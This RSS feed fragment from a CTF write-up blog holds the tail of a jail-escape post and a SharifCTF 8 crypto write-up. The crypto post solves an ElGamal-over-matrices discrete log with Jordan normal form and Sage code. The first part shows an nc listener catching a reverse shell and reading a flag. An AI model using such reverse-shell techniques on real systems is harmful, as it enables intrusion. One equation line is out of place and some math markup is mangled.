&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ nc -vvntlp 2130
Listening on any address 2130 (xds)
Connection from 41.102.162.29:39190
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ ls -la
total 12
drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 .
drwxr-xr-x 1 root ctf 4096 Mar 24 02:10 ..
-rwxr-x--- 1 root ctf 59 Mar 23 04:17 flag
$ cat flag
c2VjdXJpbmV0c3szODExMjc5Zjg4M2JkM2Q3ZWFkZjU3NmNlY2Y4ZDVjYn0$
$ cat flag | base64 -d
securinets{3811279f883bd3d7eadf576cecf8d5cb}
$
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Jails could be escaped taking various ways.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m not sure if the solution I come to is the intended one.&lt;/p&gt;
&lt;p&gt;FLAG: securinets{3811279f883bd3d7eadf576cecf8d5cb}&lt;/p&gt;</description></item><item><title>SharifCTF8_ElGamat</title><link>https://philomath213.github.io/post/sharifctf8_elgamat/</link><pubDate>Wed, 26 Sep 2018 22:19:28 +0100</pubDate><guid>https://philomath213.github.io/post/sharifctf8_elgamat/</guid><description>
&lt;h1 id=&#34;sharif-ctf-8-elgamat-writeup&#34;&gt;Sharif CTF 8 - ElGamat WriteUp&lt;/h1&gt;
&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;Event&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Challenge&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;Category&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;Sharif CTF 8&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;ElGamat&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;Crypto&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;200&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;ElGamal over Matrices: algebra-focused crypto challenge&lt;/p&gt;
&lt;p&gt;you can find full description in &lt;a href=&#34;https://philomath213.github.io/post/sharifctf8_elgamat/ElGamat.pdf&#34;&gt;ElGamat.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://philomath213.github.io/post/sharifctf8_elgamat/Matrices.txt&#34;&gt;Matrices.txt&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;This problem appears to be similar to the discrete logarithm problem (see &lt;a href=&#34;https://en.wikipedia.org/wiki/Discrete_logarithm&#34; target=&#34;_blank&#34;&gt;Discrete logarithm&lt;/a&gt;), but instead of the generator g we a have a matrix \(G\), So we need to find \(x\) such that \(G^x = H\) (both \(G\) and \(H\) are \(5\times5\) Matrices).&lt;/p&gt;
&lt;p&gt;Matrices =&amp;gt; Linear Algebra: this challenge requires some fundamentals in linear algebra.&lt;/p&gt;
&lt;p&gt;At the beginning I tried to diagonalize the matrix \(G\) and \(H\) in order to transform the problem to a discrete logarithm problem, but it will stay hard to solve since \(p-1\) is not a product of small primes which in this case Pohligâ€“Hellman algorithm is not an efficient method for computing the discrete logarithms.&lt;/p&gt;
&lt;p&gt;After doing some googling I figure out that in order to make this problem easy to solve we need to put both Matrices \(G\) and \(H\) in Jordan normal form (see &lt;a href=&#34;https://en.wikipedia.org/wiki/Jordan_normal_form&#34; target=&#34;_blank&#34;&gt;Jordan normal form&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;A Jordan matrix has each non-zero off-diagonal entry equal to \(1\), immediately above the main diagonal.&lt;/p&gt;
&lt;p&gt;for A a Jordan block as \(2\times2\) matrix, if we have a repeated eigenvalues:&lt;/p&gt;
&lt;p&gt;$$
A = \begin{pmatrix} \lambda &amp;amp; 1 \\ 0 &amp;amp; \lambda \end{pmatrix}
$$
for \(B = A^x\):
$$
B = \begin{pmatrix} \lambda^x &amp;amp; x\lambda^{x-1} \\ 0 &amp;amp; \lambda^x \end{pmatrix}
$$&lt;/p&gt;
&lt;p&gt;$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$&lt;/p&gt;
&lt;p&gt;therefore in this case:
$$
B&lt;em&gt;{12} = xB&lt;/em&gt;{11}A&lt;em&gt;{11}^{-1} \iff x = A&lt;/em&gt;{11}B&lt;em&gt;{12}B&lt;/em&gt;{11}^{-1}
$$&lt;/p&gt;
&lt;p&gt;Now we need to apply this solution to ElGamat problem&lt;/p&gt;
&lt;p&gt;In our case \(G[3][3]\) to \(G[4][4]\) is a Jordan block with repeated eigenvalues, and all arithmetic operations are in Quotient Ring \(Z/Z_p\)&lt;/p&gt;
&lt;p&gt;this is my code in sage (&lt;a href=&#34;ElGamat.sage&#34; target=&#34;_blank&#34;&gt;ElGamat.sage&lt;/a&gt;):&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import hashlib
p = 1461501637330902918203684832716283019655932542983
G = [
[1287397632974625907369332145667695136576732725719, 999149001044306271168727399637009399486427921379, 1046504160269652701583906344218556291030141088947, 724446625683754938181565321149725788430461092168, 1071845980147173642753960259602135592110139561915],
[947603660931904341080240982051313712707367037453, 312289846563741934103580532543082761760226637905, 494739786803547247505263837170488583876166831850, 680540462980071181450018491798299105995449257198, 2602258415762368797405060707505977243346704576],
[996213673531855992829525358578006610606634622631, 1025711294257038288640877971869685565227647136954, 1432432135773706484846126533752827108541355741973, 1238541870126055576875033883691918425137600727481, 1130938956963588695293783764965618873887596017827],
[1320933266015680090206505704792362493057963931979, 1151746112645644166669332171392580649376526147475, 117512451110908867093773368598681106589771485221, 78071463743800894350883457304401524272336187149, 350437511649326676405126284689545814008237687775],
[438339253001275654203062260777687750937184662400, 372483950165136927369598298270629892810999203086, 859008773869616460027135965589262417694174453098, 1174526536643808668299968641952541506024584582818, 13201859260259503932772826643483081858286638179]
]
H = [
[903022231855038558383593109888227525558007552960, 565977275270298825053282757799743346899236483368, 989303675765663596792169321947495382568831693037, 601579288654704389384765634776493921679315260303, 913791750749394879333717884106841876340654737006],
[1159121456278955861257379214176694847802842944213, 55304385436577133507085707981392660143782780650, 559867756424853909301288957105188829240808301823, 1230859641388132364539374469026906952870988170695, 1423995124592695628047882256427827379994877406997],
[1125565199147204322161069021173152827232960621114, 1373772036013472137002755957284397215018630262515, 640623873603434273377865546046279663852895430999, 1056809237992218798189986002766547616222871640976, 1426649441470162608512662468308504390861950649943],
[303729376872199895471546635639837180361513146712, 1163767872227950278851006729914569662442255257700, 1320342731346163804219021270875175061467772367004, 433001013681018647747911760920686992297849343282, 1149024280460224794070159244078925721991430685838],
[23661702916810298505759145354543089608241235601, 1048655828654821525617176122368805879408325508567, 587846047820504813842423941849757078103027466928, 1338365929525105225695097114139069216753339875455, 1425543850003062038868121400064269552725872690214]
]
R = IntegerModRing(p)
M = MatrixSpace(R, 5, 5)
g = M(G)
h = M(H)
g, p_mat = g.jordan_form(transformation=True)
print &#39;[+] jordan normal for G:&#39;
for i in g:
print i
h = p_mat.inverse()*h*p_mat
print &#39;[+] jordan normal for H:&#39;
for i in h:
print i
a11 = g[3][3]
b11 = h[3][3]
b12 = h[3][4]
x = a11*b12/b11
assert b12 == x*a11^(x-1)
print &#39;[+] solution:&#39;, x
def flag_gen(alpha):
return &#39;SharifCTF{%s}&#39; % hashlib.md5(str(alpha).encode()).hexdigest()
print &#39;[+] FLAG:&#39;, flag_gen(x)
&lt;/code&gt;&lt;/pre&gt;</description></item></channel></rss>